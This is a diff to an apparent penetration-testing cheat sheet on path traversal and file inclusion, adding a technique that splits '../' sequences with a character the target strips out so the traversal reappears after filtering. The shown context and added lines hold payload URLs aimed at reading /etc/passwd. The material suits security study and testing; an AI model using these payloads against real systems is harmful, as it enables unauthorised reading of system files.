@@ -15,6 +15,16 @@ http://example.com/read.php?file=..././..././..././..././..././..././etc/passwd
 ```Python
 http://example.com/read.php?file=..././..././..././..././..././..././eTc/p+AsS+wd
 ```
+Play with the characters, determine if certain characters are being stripped out, you may be able to abuse the order at which chars are stripped out. for example:
+if `$` is being filtered out at the last step of the process, you may be able to split your payload with that characters, with it being reconstructed post filter.
+```
+/.$./.$./.$./etc/passwd
+```
+becomes:
+```
+/../../../etc/passwd
+```
+
 ### **PHP Wrappers**
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
